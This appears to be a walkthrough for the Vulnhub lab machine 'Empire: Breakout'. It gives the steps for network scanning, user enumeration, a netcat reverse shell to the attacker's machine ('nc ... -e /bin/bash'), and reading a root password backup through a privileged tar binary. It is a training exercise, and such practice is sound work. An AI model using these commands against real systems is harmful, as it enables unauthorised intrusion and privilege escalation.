Vulnhub - Empire: Breakout Walkthrough <br>
<br>
First find the IP Address of the machine <br>
$ sudo arp-scan -l <br>
<br>
After getting the IP address of the machine, do a nmap scan <br>
$ nmap -sC -sV -A -p- <ip_address_vulnhub_machine> <br>
you will find 5 ports open - 80, 139, 445, 10000, 20000 <br>
Take a look at the website http://<ip_address_vulnhub_machine> <br>
Here you will find an Apache2 Debian Default page <br>
now in this page, check the source code <br>
at the end you will find an encoded text, you can decode it to the programming language BrainFuck, and get the output <br>
now you go to http://<ip_address_vulnhub_machine>:20000, this page requires a username and password <br>
for this you can enumerate the username using 'enum4linux' <br>
$ enum4linux -a <ip_address_vulnhub_machine> <br>
here you will get the username 'cyber' <br>, and use the password that was decoded earlier <br>
now after the login, go to Usermin -> login -> command shell <br>
here you can put the commands. <br>
you can easily get the user flag and the tar file <br>
now to spawn a shell, we will use netcat <br>
<br>
On Kali Machine <br> 
$ nc -lvnp 1234 <br>
On Vulnhub Hosted Webpage <br>
> nc <ip_kali_VM> 1234 -e /bin/bash <br>
<br>
you will get the shell on your kali terminal then <br>
to spawn a shell <br>
use > python3 -c 'import pty; pty.spawn("/bin/bash")' <br>
$ pwd <br>
$ cd /var -> go to backups folder and you will find the password file, but you will not have the permission to view the file <br>
copy the file to /tmp and then use <br>
$ /home/cyber/tar -cvf file.tar /var/backups <br>
now when the file is copied in the /tmp folder you can decompress the file <br>
$ tar -xvf file.tar <br>
now you can read the contents of the file and get the contents, which is the root password <br>
use it to login to the root <br>
$ su - root <br>
while in root you can easily get the root flag <br>
